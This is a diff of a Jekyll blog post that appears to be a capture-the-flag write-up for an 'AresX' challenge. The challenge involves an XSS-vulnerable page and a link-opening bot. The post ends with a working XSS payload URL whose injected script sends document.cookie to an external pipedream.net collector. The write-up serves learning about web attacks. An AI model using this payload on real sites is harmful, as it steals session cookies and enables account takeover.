@@ -1,21 +1,22 @@
 ---
 layout: post
-title:  "AresX challenge"
-image: ''
-date:   2016-09-12 00:06:31
+title:  server challenge aresx
+image: /assets/img/aresx.png
+date:   2022-08-29 21:52:19
 tags:
-- mongodb
-description: ''
+
+description: The challenge has two separate webpages one which is vulnerable to xss attacks and from which we must steal a cookie, and another where we can send links to be opened:
+
 categories:
-- Learn Jekyll 
+
 ---
 
 The challenge has two separate webpages one which is vulnerable to xss attacks and from which we must steal a cookie, and another where we can send links to be opened:
-![](2022-08-11-11-18-01.png)
+![](/assets/img/2022-08-11-11-18-01.png)
 Figure 1 The first app
 
 
-![](2022-08-11-11-18-14.png)
+![](/assets/img/2022-08-11-11-18-14.png)
 Figure 2 Second app
 The input to be opened by it is : 
 http://vanilla.hub/?name=<script>fetch('https://enzvin6fpk7xtu0.m.pipedream.net', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
